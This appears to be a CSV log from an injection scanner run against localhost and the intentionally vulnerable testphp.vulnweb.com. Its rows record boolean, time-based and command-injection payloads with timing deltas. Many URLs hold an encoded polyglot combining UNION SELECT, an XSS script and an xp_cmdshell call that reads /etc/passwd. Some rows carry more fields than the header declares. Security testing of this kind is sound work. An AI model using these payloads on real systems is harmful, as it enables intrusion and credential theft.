timestamp,url,parameter,injection_type,payload,baseline_time,injected_time,delta,content_length,status_code
2025-12-16T12:34:29.030407,http://example.com/page?id=0,id,boolean, AND 1=0,0.3,0.4,0.10000000000000003,5000,200
2025-12-16T12:34:29.046902,http://example.com/page?id=1,id,boolean, AND 1=1,0.31,0.41000000000000003,0.10000000000000003,5100,200
2025-12-16T12:34:29.057019,http://example.com/page?id=2,id,boolean, AND 1=0,0.32,0.42000000000000004,0.10000000000000003,5200,200
2025-12-16T12:34:29.066536,http://example.com/page?id=3,id,boolean, AND 1=1,0.32999999999999996,0.43000000000000005,0.10000000000000009,5300,200
2025-12-16T12:34:29.077403,http://example.com/page?id=4,id,boolean, AND 1=0,0.33999999999999997,0.44,0.10000000000000003,5400,200
2025-12-16T12:34:29.086807,http://example.com/page?id=5,id,boolean, AND 1=1,0.35,0.45,0.10000000000000003,5500,200
2025-12-16T12:34:29.098319,http://example.com/page?id=6,id,boolean, AND 1=0,0.36,0.46,0.10000000000000003,5600,200
2025-12-16T12:34:29.109362,http://example.com/page?id=7,id,boolean, AND 1=1,0.37,0.47000000000000003,0.10000000000000003,5700,200
2025-12-16T12:34:29.118814,http://example.com/page?id=8,id,boolean, AND 1=0,0.38,0.48000000000000004,0.10000000000000003,5800,200
2025-12-16T12:34:29.129582,http://example.com/page?id=9,id,boolean, AND 1=1,0.39,0.49,0.09999999999999998,5900,200
2026-01-02T07:13:45.515885,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.001074075698852539,5.002222299575806,5.001148223876953,261,400
2026-01-02T07:53:35.629639,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009832382202148438,5.0020670890808105,5.001083850860596,261,400
2026-01-02T07:55:32.074819,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0010557174682617188,5.002045392990112,5.000989675521851,261,400
2026-01-02T08:00:29.026484,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009801387786865234,5.001994609832764,5.001014471054077,261,400
2026-01-02T08:01:36.110476,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0012683868408203125,5.002267360687256,5.0009989738464355,261,400
2026-01-02T08:02:02.978222,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0011696815490722656,5.002096891403198,5.000927209854126,261,400
2026-01-02T08:03:51.568706,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0018148422241210938,5.003324747085571,5.00150990486145,261,400
2026-01-02T08:39:13.548192,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.4754829406738281,5.488853216171265,5.0133702754974365,10.543743732199447,261,400,,,search
2026-01-02T10:42:04.490957,http://testphp.vulnweb.com/login.php?id=1&SlFY=4435%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,time-based,""") WAITFOR DELAY '00:00:5'--",1.1849284172058105,5.919993162155151,4.735064744949341,3.9960766204891396,5523,200,,,auth
2026-01-02T10:42:31.627302,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.7120048999786377,1.1820404529571533,0.4700355529785156,0.6601577503084854,1343,200,,,generic
2026-01-02T10:42:31.684404,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0383524894714355,0.9035046100616455,-0.13484787940979004,-0.12986715087323883,1343,200,,,generic
2026-01-02T10:42:32.619714,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.2799019813537598,0.810032844543457,-0.46986913681030273,-0.36711337559874657,1343,200,,,generic
2026-01-02T10:42:34.133386,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.7120048999786377,0.8052940368652344,0.09328913688659668,0.13102316696050215,1343,200,,,generic
2026-01-02T10:42:34.766832,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0383524894714355,0.5684261322021484,-0.4699263572692871,-0.45256920172503184,1343,200,,,generic
2026-01-02T10:42:35.660066,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.2799019813537598,0.7854914665222168,-0.49441051483154297,-0.3862877954986851,1343,200,,,generic
2026-01-02T10:42:48.167354,http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157,r,boolean, AND 1=1,4.720415830612183,1.4418611526489258,-3.278554677963257,-0.6945478524797818,1816,403,,,generic
2026-01-02T10:43:00.476308,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.3357253074645996,0.5669443607330322,0.23121905326843262,0.6887149944536528,323,200,,,generic
2026-01-02T10:43:02.658834,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.3357253074645996,0.6551330089569092,0.31940770149230957,0.9513959608957671,323,200,,,generic
2026-01-22T11:25:54.684917,http://127.0.0.1:8000/ping?host=127.0.0.1,host,command_injection,sleep 3,0,5.004478375116984,5.004478375116984,,112,200,4.766600843682126,,generic
2026-01-22T11:32:46.119602,http://127.0.0.1:8000/dns?domain=example.com,domain,command_injection,sleep 3,0,5.005016326904297,5.005016326904297,,143,200,4.874412039673898,,generic
2026-01-22T11:39:37.281143,http://127.0.0.1:8000/process?cmd=ls,cmd,command_injection,sleep 3,0,5.003074010213216,5.003074010213216,,117,200,4.571614342595067,,generic
2026-01-22T14:36:06.301678,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1275546550750732,0.7813677787780762,-0.34618687629699707,-0.3070244752560999,1343,200,,,generic
2026-01-22T14:36:06.346464,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0640523433685303,0.779909610748291,-0.28414273262023926,-0.2670383035111907,1343,200,,,generic
2026-01-22T14:36:06.407622,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0660889148712158,0.6855311393737793,-0.3805577754974365,-0.3569662625592614,1343,200,,,generic
2026-01-22T14:36:08.598848,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0660889148712158,0.6617717742919922,-0.40431714057922363,-0.3792527386217738,1343,200,,,generic
2026-01-22T14:36:08.712508,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0640523433685303,0.4506552219390869,-0.6133971214294434,-0.5764726944612307,1343,200,,,generic
2026-01-22T14:36:08.778980,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1275546550750732,0.4484424591064453,-0.6791121959686279,-0.6022876078884285,1343,200,,,generic
2026-01-22T14:36:12.780302,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",1.0521984100341797,0.6289489269256592,-0.4232494831085205,-0.40225254008392924,319,200,,,generic
2026-01-22T14:36:39.736256,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.6766934394836426,0.43225669860839844,-0.24443674087524414,-0.36122227084359493,1343,200,,,generic
2026-01-22T14:36:39.816309,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.5635368824005127,0.6910033226013184,0.12746644020080566,0.2261900581517106,1343,200,,,generic
2026-01-22T14:36:39.826354,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.6049704551696777,0.5668003559112549,-0.03817009925842285,-0.06309415432149852,1343,200,,,generic
2026-01-22T14:36:42.052079,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6766934394836426,0.5648622512817383,-0.1118311882019043,-0.16526122713298086,1343,200,,,generic
2026-01-22T14:36:42.218263,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.5635368824005127,0.6573474407196045,0.0938105583190918,0.16646746867655676,1343,200,,,generic
2026-01-22T14:36:42.228022,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6049704551696777,0.5657958984375,-0.039174556732177734,-0.06475449569052151,1343,200,,,generic
2026-01-22T14:37:09.090574,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.2704195976257324,0.5514416694641113,0.2810220718383789,1.0392074920077374,323,200,,,generic
2026-01-22T14:37:11.332824,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.2704195976257324,0.6325709819793701,0.3621513843536377,1.3392201879349899,323,200,,,generic
2026-01-22T14:41:04.285170,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0010511875152588,0.36214280128479004,-0.6389083862304688,-0.638237478960815,1343,200,,,generic
2026-01-22T14:41:04.780507,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0471296310424805,0.6760094165802002,-0.3711202144622803,-0.35441668677908367,1343,200,,,generic
2026-01-22T14:41:04.932856,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1503455638885498,0.7817754745483398,-0.36857008934020996,-0.3203994529211907,1343,200,,,generic
2026-01-22T14:41:06.556459,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0010511875152588,0.7790751457214355,-0.22197604179382324,-0.2217429483748949,1343,200,,,generic
2026-01-22T14:41:07.198728,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0471296310424805,0.5430033206939697,-0.5041263103485107,-0.4814363908760969,1343,200,,,generic
2026-01-22T14:41:07.239304,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1503455638885498,0.43592023849487305,-0.7144253253936768,-0.621052793022196,1343,200,,,generic
